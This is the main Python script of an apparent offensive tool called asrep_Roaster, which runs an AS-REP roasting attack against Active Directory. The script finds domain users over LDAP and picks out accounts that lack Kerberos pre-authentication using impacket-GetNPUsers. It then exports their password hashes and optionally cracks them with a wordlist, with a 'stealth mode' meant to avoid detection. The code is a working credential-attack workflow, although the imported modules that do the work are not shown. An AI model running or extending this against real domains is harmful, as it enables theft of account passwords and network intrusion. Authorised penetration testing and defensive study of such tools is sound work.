#!/usr/bin/env python3
from asrep_Roaster import cli, enum, asrep, report, cracker, banner, discovery

def main():

    banner.print_banner()

    args = cli.parse_args()

    if args.auto_discover:
        print(f"[*] Auto-discovering users via LDAP against {args.domain} ({args.dc_ip})...")
        discovered = discovery.discover_users(
            dc_ip=args.dc_ip,
            domain=args.domain,
            username=args.discover_user,
            password=args.discover_password,
            use_ldaps=args.discover_ldaps,
        )
        if not discovered:
            print("[-] No users discovered via LDAP. Exiting.")
            return
        enum.save_users(discovered, args.users)
        print(f"[+] Discovered {len(discovered)} user(s), saved to {args.users}")

    print(f"[*] Loading users from {args.users}")
    users = enum.load_users(args.users)

    if args.stealth:
        print(f"[~] Stealth mode ENABLED — level {args.stealth}")

    print(f"[*] Enumerating against {args.domain} ({args.dc_ip}) using impacket-GetNPUsers...")
    asrep.process_users(
        users,
        args.domain,
        args.dc_ip,
        args.users,
        stealth_level=args.stealth
    )

    roastable_users = [u for u in users if u.roastable]

    if not roastable_users:
        print("[-] No roastable users found. Exiting.")
        return
        
    # --- Enum-only mode ---
    if args.enum_only:
        cli.print_enum_only_results(users)
        return

    selected_users = cli.interactive_selection(users)

    print(f"[*] Generating report to {args.output}")
    report.generate_full_report(selected_users, args.output)

    print(f"[*] Exporting hashes to {args.hashes}")
    report.export_hashes(selected_users, args.hashes)

    if args.crack:
        print(f"[*] Starting automatic cracking with wordlist: {args.wordlist}")
        cracker.crack_hashes(
            selected_users,
            hash_file=args.hashes,
            wordlist=args.wordlist,
            rules_file=args.rules,
            timeout=args.crack_timeout
        )
        report.generate_full_report(selected_users, args.output)

    print("[+] Done.")

if __name__ == "__main__":
    main()
